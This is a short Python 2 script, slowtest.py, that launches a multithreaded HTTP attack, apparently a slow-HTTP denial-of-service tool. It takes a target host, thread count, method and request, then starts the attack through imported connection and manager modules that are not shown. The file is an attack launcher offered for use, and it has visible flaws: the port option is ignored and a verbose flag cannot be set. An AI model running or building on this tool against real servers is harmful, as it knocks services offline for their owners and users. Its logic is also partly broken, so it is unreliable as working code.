#!/bin/python
import getopt,time,threading
from connection import *
from manager import *
def help_usage():

  print """Usage: python2.7 slowtest.py [OPTIONS]...
  Options: 
	-h, --host	        Specify the destination host	
	-t, --threads	    The threads for complete total connections  	
	-p, --port	    The port where is running the http server  	
	-r, --request       Request for the http method
	-m, --method        HTTP Method, PUT, GET, POST, OPTIONS

	
	
Example:

	./python2.7 slowtest.py -h 192.168.1.2  -t 200 

	This execution will generate a attack using 200 threads 
"""

host=""
port=80
method=""
request=""
verbose=False
threads=50

	
def init():
  con=Connection()
  con.setOption("host",host)
  if (method!="" and request!=""):
    con.setOption("request",method+" "+request +" HTTP/1.0\r\n\r\n")
  man=Manager()
  man.setConnection(con)
  con.setOption("manager",man)
  man.setThreads(threads)
  man.startAttack()
  con.setOption("manager",man)
  while True:
	print man.getStatus()
	time.sleep(1)
try:
  opts, args = getopt.getopt(sys.argv[1:], "h:r:t:p:m:", ["host=", "request=","threads=","port=","method="])
  for o, a in opts:
  
    if o == "-v":
      verbose=True
    elif o in ("-h", "--host"):
      host=a 
    elif o in ("-t", "--threads"):
      threads=int(a)
    elif o in ("-p", "--port"):
      port=int(a)
    elif o in ("-r", "--request"):
      request=a
    elif o in ("-m", "--method"):	
      method=a
      
  print "Attack to: "+str(host)+":"+str(port)
  print "Threads: "+str(threads)
  print "Method: " +method
  print "Request: "+ request
  init()
    
except getopt.GetoptError as err:
  help_usage()
  print err	

help_usage()
